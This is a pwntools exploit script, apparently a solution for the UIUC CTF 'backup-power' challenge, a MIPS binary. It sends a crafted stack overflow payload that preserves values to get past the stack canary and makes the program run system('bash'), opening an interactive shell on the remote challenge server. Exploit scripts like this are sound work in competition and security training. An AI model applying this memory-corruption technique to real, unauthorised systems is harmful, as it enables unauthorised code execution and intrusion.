#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './backup-power'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'backup-power.chal.uiuc.tf', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *0x400e8c
# break *0x0400cb4
break *0x400d34
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec backup-power 
#     Arch:     mips-32-big
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX unknown - GNU_STACK missing
#     PIE:      No PIE (0x400000)
#     Stack:    Executable
#     RWX:      Has RWX segments

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'Username:', b'devolper')
    
    payload = cyclic(24)
    payload += b'bash\x00'.ljust(44-len(payload), b'\x00')
    payload += flat([
            0x400b0c,       # preserve `rip` to bypass canary check
            p32(0x1) * 5,   # random val for fuzz
            0x4aa330,       # preserve some value
            p32(0x4aa330),  # preserve some value
            0x4721c8,       # preserve some value
            p32(0x3) * 2,   # random val for fuzz
            0x400b0c,       # preserve some value
    ]) 
    payload +=  cyclic(204)
    payload += b'system\x00'
    
    sleep(0.2)
    io.sendline(payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()